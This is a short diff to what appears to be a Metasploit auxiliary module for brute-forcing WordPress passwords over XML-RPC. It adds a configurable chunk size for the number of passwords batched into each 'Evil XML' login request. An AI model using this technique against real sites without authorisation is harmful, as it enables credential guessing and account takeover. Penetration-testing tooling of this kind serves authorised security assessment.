@@ -34,7 +34,8 @@ class Metasploit3 < Msf::Auxiliary
                                       File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
           OptPath.new('WPPASS_FILE', [true, 'File containing passwords, one per line',
                                       File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")]),
-          OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6])
+          OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6]),
+          OptInt.new('CHUNKSIZE', [true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500])
         ], self.class)
   end
 
@@ -53,8 +54,8 @@ class Metasploit3 < Msf::Auxiliary
 
     vprint_warning('Generating XMLs may take a while depends on the list file(s) size.') if passwords.size > 1500
     xml_payloads = []                          # Container for all generated XMLs
-    # Evil XML | Limit number of log-ins to 1500/request for wordpress limitation
-    passwords.each_slice(1500) do |pass_group|
+    # Evil XML | Limit number of log-ins to CHUNKSIZE/request due Wordpress limitation which is 1700 maximum.
+    passwords.each_slice(datastore['CHUNKSIZE']) do |pass_group|
 
       document = Nokogiri::XML::Builder.new do |xml|
         xml.methodCall {
